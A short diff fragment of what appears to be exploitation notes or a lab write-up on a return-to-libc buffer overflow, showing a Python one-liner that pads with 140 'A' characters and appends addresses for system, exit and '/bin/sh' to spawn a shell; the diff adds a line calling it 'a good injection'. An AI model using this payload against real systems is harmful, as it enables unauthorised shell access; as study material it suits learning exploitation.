@@ -374,3 +374,5 @@ we can concatenate system, exit and /bin/sh
 in python we do:
 print('A'*140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe
 5\xb7' + '\x58\xcc\xf8\xb7')
+
+that becomes a good injection:
